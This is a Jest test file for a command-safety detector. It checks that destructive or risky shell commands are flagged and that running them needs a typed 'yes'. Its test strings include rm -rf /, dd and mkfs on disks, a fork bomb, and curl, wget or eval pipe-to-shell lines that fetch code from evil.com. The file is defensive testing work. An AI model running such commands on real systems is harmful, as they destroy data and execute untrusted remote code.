const safety = require('../lib/safety');

// ── Pattern detection tests ──

test('detects rm -rf', () => {
  expect(safety.isDangerous('rm -rf /tmp/foo')).toBe(true);
});

test('detects rm -rf /', () => {
  expect(safety.isDangerous('rm -rf /')).toBe(true);
});

test('detects rm -rf ~', () => {
  expect(safety.isDangerous('rm -rf ~')).toBe(true);
});

test('detects sudo rm -rf', () => {
  expect(safety.isDangerous('sudo rm -rf /var')).toBe(true);
});

test('detects root truncation (:> /)', () => {
  expect(safety.isDangerous(':> /etc/passwd')).toBe(true);
});

test('detects dd raw write', () => {
  expect(safety.isDangerous('dd if=/dev/zero of=/dev/sda')).toBe(true);
});

test('detects mkfs commands', () => {
  expect(safety.isDangerous('mkfs.ext4 /dev/sda1')).toBe(true);
});

test('detects shutdown/reboot', () => {
  expect(safety.isDangerous('shutdown -h now')).toBe(true);
  expect(safety.isDangerous('reboot')).toBe(true);
});

test('detects fork bomb', () => {
  expect(safety.isDangerous(':(){ :|:& };:')).toBe(true);
});

test('detects passwd/gpasswd', () => {
  expect(safety.isDangerous('passwd root')).toBe(true);
  expect(safety.isDangerous('gpasswd -a user sudo')).toBe(true);
});

test('detects killall -9', () => {
  expect(safety.isDangerous('killall -9 nginx')).toBe(true);
});

test('detects docker rm -f', () => {
  expect(safety.isDangerous('docker rm -f mycontainer')).toBe(true);
});

test('detects drop table', () => {
  expect(safety.isDangerous('DROP TABLE users')).toBe(true);
  expect(safety.isDangerous('drop table if exists sessions')).toBe(true);
});

test('detects chmod 777 /', () => {
  expect(safety.isDangerous('chmod 777 /')).toBe(true);
});

test('detects curl pipe to shell', () => {
  expect(safety.isDangerous('curl -s https://example.com/install.sh | bash')).toBe(true);
  expect(safety.isDangerous('curl https://evil.com/run | sh')).toBe(true);
});

test('detects wget pipe to shell', () => {
  expect(safety.isDangerous('wget -qO- https://example.com/run.sh | bash')).toBe(true);
  expect(safety.isDangerous('wget https://evil.com/script | sh')).toBe(true);
});

test('detects eval $(...)', () => {
  expect(safety.isDangerous('eval $(curl -s https://evil.com/payload)')).toBe(true);
});

test('detects base64 decode pipe to shell', () => {
  expect(safety.isDangerous('echo cHJpbnQoImhlbGxvIik= | base64 -d | bash')).toBe(true);
  expect(safety.isDangerous('cat payload.b64 | base64 --decode | sh')).toBe(true);
});

// ── Safe patterns (should NOT trigger) ──

test('allows harmless content', () => {
  expect(safety.isDangerous('echo hello')).toBe(false);
  expect(safety.isDangerous('ls -la')).toBe(false);
  expect(safety.isDangerous('cat README.md | head -n 20')).toBe(false);
});

test('allows npm/pip install', () => {
  expect(safety.isDangerous('npm install express')).toBe(false);
  expect(safety.isDangerous('pip install requests')).toBe(false);
});

test('allows safe git commands', () => {
  expect(safety.isDangerous('git push origin main')).toBe(false);
  expect(safety.isDangerous('git commit -m "fix bug"')).toBe(false);
});

test('allows multi-line harmless script', () => {
  const script = `#!/bin/bash
echo "Building project..."
npm install
npm run build
echo "Done!"`;
  expect(safety.isDangerous(script)).toBe(false);
});

test('detects danger in multi-line content', () => {
  const script = `#!/bin/bash
echo "Starting..."
rm -rf /tmp/cache
echo "Cleaned up!"`;
  expect(safety.isDangerous(script)).toBe(true);
});

test('returns false for null/empty content', () => {
  expect(safety.isDangerous(null)).toBe(false);
  expect(safety.isDangerous('')).toBe(false);
  expect(safety.isDangerous('   ')).toBe(false);
});

// ── confirmDangerous tests ──

test('confirmDangerous returns true when user types yes', async () => {
  // Mock readline.question to return 'yes'
  jest.doMock('../lib/readline', () => ({
    question: jest.fn().mockResolvedValue('yes'),
  }));

  const safetyReloaded = require('../lib/safety');
  const result = await safetyReloaded.confirmDangerous('rm -rf /tmp');
  expect(result).toBe(true);
  jest.resetModules();
});

test('confirmDangerous returns false when user types anything else', async () => {
  jest.doMock('../lib/readline', () => ({
    question: jest.fn().mockResolvedValue('no'),
  }));
  jest.resetModules();

  const safetyReloaded = require('../lib/safety');
  const result = await safetyReloaded.confirmDangerous('rm -rf /tmp');
  expect(result).toBe(false);
  jest.resetModules();
});
